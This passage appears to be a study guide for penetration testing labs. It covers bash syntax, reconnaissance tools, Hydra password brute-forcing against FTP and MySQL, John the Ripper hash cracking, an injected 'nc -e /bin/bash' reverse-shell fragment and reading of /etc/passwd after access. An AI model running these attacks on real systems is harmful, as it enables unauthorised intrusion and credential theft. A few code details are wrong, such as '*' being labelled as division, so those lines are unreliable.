<p>String comparison operators “<code>&lt;</code> / <code>&gt;</code>” <strong>works only</strong> within the double square brackets <code>[[ &lt;condition&gt; ]]</code>.</p>
<table>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>[[ -z STRING ]]</code></td>
<td>Empty string</td>
</tr>
<tr class="even">
<td><code>[[ -n STRING ]]</code></td>
<td>Not empty string</td>
</tr>
<tr class="odd">
<td><code>[[ STRING == STRING ]]</code></td>
<td>Equal</td>
</tr>
<tr class="even">
<td><code>[[ STRING != STRING ]]</code></td>
<td>Not Equal</td>
</tr>
<tr class="odd">
<td><code>[[ NUM -eq NUM ]]</code></td>
<td>Equal</td>
</tr>
<tr class="even">
<td><code>[[ NUM -ne NUM ]]</code></td>
<td>Not equal</td>
</tr>
<tr class="odd">
<td><code>[[ NUM -lt NUM ]]</code></td>
<td>Less than</td>
</tr>
<tr class="even">
<td><code>[[ NUM -le NUM ]]</code></td>
<td>Less than or equal</td>
</tr>
<tr class="odd">
<td><code>[[ NUM -gt NUM ]]</code></td>
<td>Greater than</td>
</tr>
<tr class="even">
<td><code>[[ NUM -ge NUM ]]</code></td>
<td>Greater than or equal</td>
</tr>
<tr class="odd">
<td><code>[[ -o noclobber ]]</code></td>
<td>If OPTIONNAME is enabled</td>
</tr>
<tr class="even">
<td><code>[[ ! EXPR ]]</code></td>
<td>Not</td>
</tr>
<tr class="odd">
<td><code>[[ X &amp;&amp; Y ]]</code></td>
<td>And</td>
</tr>
<tr class="even">
<td><code>[[ X || Y ]]</code></td>
<td>Or</td>
</tr>
<tr class="odd">
<td><code>[[ STRING =~ STRING ]]</code></td>
<td>Regexp</td>
</tr>
<tr class="even">
<td><code>(( NUM &lt; NUM ))</code></td>
<td>Numeric conditions</td>
</tr>
</tbody>
</table>
<h4 data-number="1.4.0.2" id="file-operators"><span class="header-section-number">1.4.0.2</span> File Operators</h4>
<table>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>[[ -e FILE ]]</code></td>
<td>Exists</td>
</tr>
<tr class="even">
<td><code>[[ -r FILE ]]</code></td>
<td>Readable</td>
</tr>
<tr class="odd">
<td><code>[[ -h FILE ]]</code></td>
<td>Symlink</td>
</tr>
<tr class="even">
<td><code>[[ -d FILE ]]</code></td>
<td>Directory</td>
</tr>
<tr class="odd">
<td><code>[[ -w FILE ]]</code></td>
<td>Writable</td>
</tr>
<tr class="even">
<td><code>[[ -s FILE ]]</code></td>
<td>Size is &gt; 0 bytes</td>
</tr>
<tr class="odd">
<td><code>[[ -f FILE ]]</code></td>
<td>File</td>
</tr>
<tr class="even">
<td><code>[[ -x FILE ]]</code></td>
<td>Executable</td>
</tr>
<tr class="odd">
<td><code>[[ FILE1 -nt FILE2 ]]</code></td>
<td>1 is more recent than 2</td>
</tr>
<tr class="even">
<td><code>[[ FILE1 -ot FILE2 ]]</code></td>
<td>2 is more recent than 1</td>
</tr>
<tr class="odd">
<td><code>[[ FILE1 -ef FILE2 ]]</code></td>
<td>Same files</td>
</tr>
</tbody>
</table>
<h3 data-number="1.4.1" id="arguments"><span class="header-section-number">1.4.1</span> Arguments</h3>
<p>It is possible to pass up to 9 arguments (<code>$0</code>-<code>$9</code>) to a script:</p>
<pre class="shell"><code>            $ ./script.sh ARG1 ARG2 ARG3 ... ARG9
ASSIGNMENTS:       $0      $1   $2   $3 ...   $9</code></pre>
<h3 data-number="1.4.2" id="special-variables"><span class="header-section-number">1.4.2</span> Special Variables</h3>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>$#</code></td>
<td>This variable holds the number of arguments passed to the script.</td>
</tr>
<tr class="even">
<td><code>$@</code></td>
<td>This variable can be used to retrieve the list of command-line arguments.</td>
</tr>
<tr class="odd">
<td><code>$n</code></td>
<td>Each command-line argument can be selectively retrieved using its position. For example, the first argument is found at <code>$1</code>.</td>
</tr>
<tr class="even">
<td><code>$$</code></td>
<td>The process ID of the currently executing process.</td>
</tr>
<tr class="odd">
<td><code>$?</code></td>
<td>The exit status of the script. This variable is useful to determine a command’s success. The value 0 represents successful execution, while 1 is a result of a failure.</td>
</tr>
</tbody>
</table>
<h3 data-number="1.4.3" id="variables"><span class="header-section-number">1.4.3</span> Variables</h3>
<p>It is important that when assigning a variable there is <strong>no space</strong> around the equal sign:</p>
<pre class="shell"><code>variable=&quot;test&quot;</code></pre>
<h3 data-number="1.4.4" id="arrays"><span class="header-section-number">1.4.4</span> Arrays</h3>
<p>The values in the array are separated by spaces. If we want to escape these spaces, we can use single quotes (<code>&#39;</code>…<code>&#39;</code>) or double quotes (<code>&quot;</code>…<code>&quot;</code>).</p>
<pre class="shell"><code>#!/bin/bash

domains=(www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com www2.inlanefreight.com)

echo ${domains[0]}</code></pre>
<h3 data-number="1.4.5" id="arithmetic"><span class="header-section-number">1.4.5</span> Arithmetic</h3>
<table>
<thead>
<tr class="header">
<th>Operator</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>+</code></td>
<td>Addition</td>
</tr>
<tr class="even">
<td><code>-</code></td>
<td>Subtraction</td>
</tr>
<tr class="odd">
<td><code>*</code></td>
<td>Division</td>
</tr>
<tr class="even">
<td><code>%</code></td>
<td>Modulus</td>
</tr>
<tr class="odd">
<td><code>variable++</code></td>
<td>Increase the value of the variable by 1</td>
</tr>
<tr class="even">
<td><code>variable--</code></td>
<td>Decrease the value of the variable by 1</td>
</tr>
</tbody>
</table>
<p>We can also calculate the length of the variable. Using this function <code>${#variable}</code>, every character gets counted, and we get the total number of characters in the variable.</p>
<h3 data-number="1.4.6" id="input-control"><span class="header-section-number">1.4.6</span> Input Control</h3>
<p>Read input from the user, while the script is running:</p>
<pre class="shell"><code>read -p &quot;Select your option: &quot; opt</code></pre>
<pre><code>*(-p    = Ensures that our input remains on the same line
  opt   = The input will be stored in the variable opt)</code></pre>
<h3 data-number="1.4.7" id="output-control"><span class="header-section-number">1.4.7</span> Output Control</h3>
<p>In some cases the scripts take longer time and the user don’t have any feedback. To solve this problem we can use <code>tee</code>, which enables us to write something to a file and also returning it as standard output:</p>
<pre class="shell"><code>netrange=$(whois $ip | grep &quot;NetRange\|CIDR&quot; | tee -a CIDR.txt)</code></pre>
<pre><code>*(-a   = Append to the given FILEs, do not overwrite)</code></pre>
<h3 data-number="1.4.8" id="loops"><span class="header-section-number">1.4.8</span> Loops</h3>
<h4 data-number="1.4.8.1" id="for-loops"><span class="header-section-number">1.4.8.1</span> For Loops</h4>
<p>The idea behind for loops is that we iterate over something, or we have a limit how often the loop should run.</p>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code>for $variable in 1 2 3 4
do
    echo $variable
done


for $variable in file1 file2 file3
do
    echo $variable
done


for ip in &quot;10.10.10.170 10.10.10.174 10.10.10.175&quot;
do
    ping -c 1 $ip
done</code></pre>
<h4 data-number="1.4.8.2" id="while-loops"><span class="header-section-number">1.4.8.2</span> While Loops</h4>
<p>The while loop will be executed as long the condition is fulfilled. There are two keywords available which gives us more control over the while loop.</p>
<ul>
<li><code>break</code> → Interrupts the loop</li>
<li><code>continue</code> → Immediately continues with the next loop run</li>
</ul>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code>#!/bin/bash

counter=0

while [ $counter -lt 10 ]
do
  # Increase $counter by 1
  ((counter++))
  echo &quot;Counter: $counter&quot;

  if [ $counter == 2 ]
  then
    continue
  elif [ $counter == 4 ]
  then
    break
  fi
done</code></pre>
<h4 data-number="1.4.8.3" id="until-loops"><span class="header-section-number">1.4.8.3</span> Until Loops</h4>
<p>Nevertheless, the until loop works precisely like the while loop, but with the difference:</p>
<ul>
<li>The code inside an until loop is executed as long as the particular condition is false</li>
</ul>
<h3 data-number="1.4.9" id="switch-case"><span class="header-section-number">1.4.9</span> Switch case</h3>
<p>The keyword for a switch-case-statement starts with the keyword <code>case</code>, followed by the variable or value as an expression, which is then compared in the pattern. If the variable or value matches the expression, then the statements are executed after the parenthesis and ended with a double semicolon (<code>;;</code>).</p>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code>read -p &quot;Select your option: &quot; opt

case $opt in
    &quot;1&quot;) network_range ;;
    &quot;2&quot;) ping_host ;;
    &quot;3&quot;) network_range &amp;&amp; ping_host ;;
    &quot;*&quot;) exit 0 ;;
esac</code></pre>
<h3 data-number="1.4.10" id="functions"><span class="header-section-number">1.4.10</span> Functions</h3>
<p>The definition of a function is at the beginning of a bash script this ensures that it is already defined before it is called.</p>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code># Method 1 - Functions

function name {
    &lt;commands&gt;
}

# Method 2 - Functions

name() {
    &lt;commands&gt;
}</code></pre>
<p>The function is called only by calling the specified name of the function.</p>
<h4 data-number="1.4.10.1" id="parameter-passing"><span class="header-section-number">1.4.10.1</span> Parameter Passing</h4>
<p>In principle, the same applies to the passed parameters as to parameters passed to a shell script. These are <code>$1</code> - <code>$9</code> (<code>${n}</code>), or <code>$variable</code> as we have already seen. Each function has its own set of parameters. So they do not collide with those of other functions or the parameters of the shell script</p>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code>#!/bin/bash

function print_pars {
    echo $1 $2 $3
}

one=&quot;First parameter&quot;
two=&quot;Second parameter&quot;
three=&quot;Third parameter&quot;

print_pars &quot;$one&quot; &quot;$two&quot; &quot;$three&quot;</code></pre>
<h4 data-number="1.4.10.2" id="return-values"><span class="header-section-number">1.4.10.2</span> Return Values</h4>
<p>Like our bash script, the functions return status codes:</p>
<table>
<thead>
<tr class="header">
<th>Return Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>1</code></td>
<td>General errors</td>
</tr>
<tr class="even">
<td><code>2</code></td>
<td>Misuse of shell builtins</td>
</tr>
<tr class="odd">
<td><code>126</code></td>
<td>Command invoked cannot execute</td>
</tr>
<tr class="even">
<td><code>127</code></td>
<td>Command not found</td>
</tr>
<tr class="odd">
<td><code>128</code></td>
<td>Invalid argument to exit</td>
</tr>
<tr class="even">
<td><code>128+n</code></td>
<td>Fatal error signal “<code>n</code>”</td>
</tr>
<tr class="odd">
<td><code>130</code></td>
<td>Script terminated by Control-C</td>
</tr>
<tr class="even">
<td><code>255\*</code></td>
<td>Exit status out of range</td>
</tr>
</tbody>
</table>
<p>To get the value of a function back, we can use several methods like <code>return</code>, <code>echo</code>, or a <code>variable</code>.</p>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code>#!/bin/bash

function given_args {

        if [ $# -lt 1 ]
        then
                echo -e &quot;Number of arguments: $#&quot;
                return 1
        else
                echo -e &quot;Number of arguments: $#&quot;
                return 0
        fi
}

# No arguments given
given_args
echo -e &quot;Function status code: $?\n&quot;

# One argument given
given_args &quot;argument&quot;
echo -e &quot;Function status code: $?\n&quot;

# Pass the results of the funtion into a variable
content=$(given_args &quot;argument&quot;)

echo -e &quot;Content of the variable: \n\t$content&quot;</code></pre>
<h3 data-number="1.4.11" id="debugging"><span class="header-section-number">1.4.11</span> Debugging</h3>
<p>Bash allows us to debug our code by using the “<code>-x</code>” (<code>xtrace</code>) and “<code>-v</code>” (<code>verbose</code>) options.</p>
<h3 data-number="1.4.12" id="cheat-sheet"><span class="header-section-number">1.4.12</span> Cheat Sheet</h3>
<p>For more information about bash scripting have a look in the following cheat sheet: https://devhints.io/bash ## Information Gathering ### Passive Information Gathering</p>
<p><code>whois</code> can be used for querying domain names, IP addresses, or autonomous systems.</p>
<h4 data-number="1.4.12.1" id="dig"><span class="header-section-number">1.4.12.1</span> DIG</h4>
<p><code>dig</code> is a DNS lookup utility.</p>
<p><code>WaybackMachine</code> is an American digital library that provides free public access to digitalized materials, including websites, collected automatically via its web crawlers.</p>
<pre class="shell"><code>$ dig any google.com @8.8.8.8</code></pre>
<pre><code>*(any         = query all types of records
  @8.8.8.8    = define a dns server from which you wnat to retrieve the information)</code></pre>
<h4 data-number="1.4.12.2" id="project-sonar"><span class="header-section-number">1.4.12.2</span> Project Sonar</h4>
<p>To find all available subdomains we can use <code>Project Sonar</code>:</p>
<pre class="shell"><code>$ curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r &#39;.[]&#39; | sort -u</code></pre>
<h4 data-number="1.4.12.3" id="certificates"><span class="header-section-number">1.4.12.3</span> Certificates</h4>
<p>To gain more information we can search for certificates at sites like <code>https://crt.sh</code> and <code>https://search.censys.io/certificates</code>.</p>
<h3 data-number="1.4.13" id="active-information-gathering"><span class="header-section-number">1.4.13</span> Active Information Gathering</h3>
<p><code>Wappalyzer</code> is a browser extension which finds out what technologies are used on a website.</p>
<p><code>WAFW00F</code> is a Web Application Firewall Fingerprinting Tool.</p>
<p><code>Aquatone</code> is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.</p>
<h4 data-number="1.4.13.1" id="http-header"><span class="header-section-number">1.4.13.1</span> HTTP Header</h4>
<p>We can gain information about the version of the web server and the operating system with the curl flag <code>-I</code> which returns us the <code>http header</code>:</p>
<pre class="shell"><code>$ curl -I &quot;http://${TARGET}&quot;</code></pre>
<p><code>X-Powered-By header</code> can tell us what the web app is using. We can see values like PHP, ASP.NET, JSP, etc.</p>
<p><code>Cookies</code> are another value to look at as each technology by default has its cookies. Some default cookie values are:</p>
<ul>
<li>.NET: ASPSESSIONID<RANDOM>=<COOKIE_VALUE></li>
<li>PHP: PHPSESSID=<COOKIE_VALUE></li>
<li>JAVA: JSESSION=<COOKIE_VALUE></li>
</ul>
<h4 data-number="1.4.13.2" id="whatweb"><span class="header-section-number">1.4.13.2</span> WhatWeb</h4>
<p><code>WhatWeb</code> is a Web scanner - identify technologies used by websites.</p>
<pre class="shell"><code>$ whatweb -a 1 https://www.facebook.com -v</code></pre>
<pre><code>*(-a    = Set the aggression level. 1(low) - 4(high) 
  -v    = verbose)</code></pre>
<!-- USE wafwoof to detect the CMS!!! -->
<h2 data-number="1.5" id="exploiting-network-services"><span class="header-section-number">1.5</span> Exploiting Network Services</h2>
<h3 data-number="1.5.1" id="github-repos"><span class="header-section-number">1.5.1</span> GitHub Repos</h3>
<p>SecLists: https://github.com/danielmiessler/SecLists</p>
<h3 data-number="1.5.2" id="ssh"><span class="header-section-number">1.5.2</span> SSH</h3>
<p>Authenticate via ssh with the key-file <code>id_rsa</code>:</p>
<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ssh <span class="at">-i</span> id_rsa user@10.10.10.10</span></code></pre></div>
<pre class="text"><code>*(-i [file]  = Identity file)</code></pre>
<h3 data-number="1.5.3" id="nmap"><span class="header-section-number">1.5.3</span> NMAP</h3>
<p>Checks open ports in defined range and check running services with <code>Nmap</code>:</p>
<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap 10.10.221.8 <span class="at">-sV</span> <span class="at">-p</span> 0-60000</span></code></pre></div>
<pre class="text"><code>*(-p-  = Scans the whole portrange
  -p   = Specific port or portrange
  -sV  = Attempts to determine the version of the service running on port
  -A   = Enables OS detection, version detection, script scanning and traceroute)</code></pre>
<h3 data-number="1.5.4" id="ftp"><span class="header-section-number">1.5.4</span> FTP</h3>
<p>Download a File from an FTP-Server with <code>Wget</code>:</p>
<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> wget <span class="at">-m</span> ftp://user:password@ftp.example.com</span></code></pre></div>
<pre class="text"><code>*(-m = --mirror)</code></pre>
<h4 data-number="1.5.4.1" id="hydra"><span class="header-section-number">1.5.4.1</span> Hydra</h4>
<p>Use <code>Hydra</code> for cracking password in our example on an FTP-Service:</p>
<div class="sourceCode" id="cb39"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> hydra <span class="at">-t</span> 4 <span class="at">-l</span> dale <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.10.6 ftp</span></code></pre></div>
<pre class="text"><code>*(-t 4      = Number of parallel connections per target
  -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
  -P [file] = Points to the file containing the list of possible passwords
  -vV       = Very verbose: shows the login+pass combination for each attempt
  [IP]      = The IP address of the target machine
  [ftp]     = Sets the protocol)</code></pre>
<h3 data-number="1.5.5" id="nfs"><span class="header-section-number">1.5.5</span> NFS</h3>
<p>List name or <code>NFS</code> shares:</p>
<div class="sourceCode" id="cb41"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> /usr/sbin/showmount <span class="at">-e</span> [IP]</span></code></pre></div>
<pre class="text"><code>*(-e    = Shows the NSF server&#39;s export list
  [IP]  = The IP Address of the NFS server)</code></pre>
<p>Connect <code>NFS</code> share with mount point on our machine:</p>
<div class="sourceCode" id="cb43"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> sudo mount <span class="at">-t</span> nfs IP:share /tmp/mount/ <span class="at">-nolock</span></span></code></pre></div>
<pre class="text"><code>*(-t nfs    = Type of device to mount, then specifying that it&#39;s NFS
  IP:share  = The IP Address of the NFS server, and the name of the share we wish to mount
  -nolock   = Specifies not to use NLM locking)</code></pre>
<h3 data-number="1.5.6" id="smtp"><span class="header-section-number">1.5.6</span> SMTP</h3>
<p>There are three relevant commands, when it comes to <code>SMTP</code>:</p>
<pre class="text"><code>(VRFY    = Confirming the names of valid users
 EXPN    = Reveals the actual address of user’s aliases and lists of e-mail (mailing lists)
 RCPT TO = Specifies the e-mail address of the recipient)</code></pre>
<h3 data-number="1.5.7" id="metasploit"><span class="header-section-number">1.5.7</span> Metasploit</h3>
<pre class="text"><code>*(search [name]                 = Search for a module and his description
  use [name]                    = Selects a module by name
  options                       = When a module is selected we will see the options of the module
  set [option] [parameter]      = Set a specific option with a specific parameter
  run                           = Run the exploit)</code></pre>
<p>For further information see the following documentation: https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/</p>
<h3 data-number="1.5.8" id="mysql"><span class="header-section-number">1.5.8</span> MySQL</h3>
<p>First we need a client, which is in our case <code>default-mysql-client</code>:</p>
<div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
<pre class="text"><code>*(-h [IP]        = Connect to the MariaDB server on the given host
  -u [username]  = The MariaDB user name to use when connecting to the server
  -p             = The password to use when connecting to the server)</code></pre>
<p>If we do not have any credentials we can use <code>Nmap</code> or <code>Metasplot</code> to gain this information:</p>
<pre class="nmap```"><code>```bash
$ nmap --script=mysql-enum [target]</code></pre>
<pre class="text"><code>*(--script=mysql-enum           = Scan with a single script: mysql-enum
  [target]                      = The IP address of the target)</code></pre>
<p>Now that we know some usernames of the database, we can try to crack the passwords of them with <code>Hydra</code>:</p>
<div class="sourceCode" id="cb51"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
<pre class="text"><code>*(-t 16     = Number of parallel connections per target
  -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
  -P [file] = Points to the file containing the list of possible passwords
  -vV       = Very verbose: shows the login+pass combination for each attempt
  [IP]      = The IP address of the target machine
  [mysql]   = Sets the protocol)</code></pre>
<h3 data-number="1.5.9" id="john-the-ripper"><span class="header-section-number">1.5.9</span> John the Ripper</h3>
<p>If we have a hash which look something like the following example:</p>
<pre><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
<p>We can pipe the hash in a file:</p>
<div class="sourceCode" id="cb54"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb54-1"><a href="#cb54-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
<p>And crack the password with <code>John the Ripper</code>:</p>
<div class="sourceCode" id="cb55"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
<span id="cb55-2"><a href="#cb55-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
<pre class="text"><code>*(--show            = show cracked passwords
  --format=&lt;param&gt;  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt</code></pre>
<h2 data-number="1.6" id="web-fundamentals"><span class="header-section-number">1.6</span> Web Fundamentals</h2>
<h3 data-number="1.6.1" id="curl"><span class="header-section-number">1.6.1</span> Curl</h3>
<p>If we want to get sources of a webpage, we can do this with <code>Curl</code>:</p>
<div class="sourceCode" id="cb57"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="#cb57-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-X</span> GET http://10.10.4.59:8081/ctf/post</span></code></pre></div>
<pre class="text"><code>*(-X [GET]          = Set kind of fetch
  [target]          = The URL of the webpage we want to fetch
  -d [param]        = Sends the specified data in a POST  request  to  the HTTP server)</code></pre>
<p><code>CEWL</code> password list generator.</p>
<p><code>WPSCAN</code> scans the Word Press version.</p>
<p><code>Gobuster</code> is a tool used to brute-force URIs including directories and files as well as DNS subdomains.</p>
<p><code>DIRB</code> is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects.</p>
<h3 data-number="1.6.2" id="reverse-shell"><span class="header-section-number">1.6.2</span> Reverse Shell</h3>
<pre class="shell"><code>$ ;nc -e /bin/bash</code></pre>
<p>For more information checkout the following GitHub repo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</p>
<p>If you gain access depending on the OS you can try the following commands to get more information: &gt;Linux</p>
<pre class="shell"><code>  $ whoami
  $ id
  $ ifconfig/ip addr
  $ uname -a                  # print system information
  $ ps -ef                    # -e = select all processes  -f = do full-format listing
  $ less /etc/passwd          # usernames with UID, GID, GECOS, home directory and login shell
  $ cut -d: -f1 /etc/passwd   # only usernames
  $ cat /etc/os-release       # Get inforamtion about the OS and the OS version</code></pre>
<blockquote>
<p>Windows</p>
</blockquote>
<pre class="shell"><code>  $ whoami
  $ ver
  $ ipconfig
  $ tasklist
  $ netstat -an</code></pre>
</body>
</html>
